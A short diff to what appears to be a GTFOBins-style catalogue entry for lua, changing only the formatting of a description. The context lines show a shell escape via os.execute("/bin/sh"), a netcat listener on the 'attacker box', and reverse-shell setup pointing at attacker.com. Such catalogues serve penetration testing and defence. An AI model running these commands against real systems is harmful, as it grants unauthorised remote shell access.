@@ -3,7 +3,7 @@ functions:
   execute-interactive:
     - code: lua -e 'os.execute("/bin/sh")'
   reverse-shell-non-interactive:
-    - description: Run <code>nc -l -p 12345</code> on the attacker box to receive the shell. This requires `lua-socket` installed.
+    - description: Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires `lua-socket` installed.
       code: |
         export RHOST=attacker.com
         export RPORT=12345
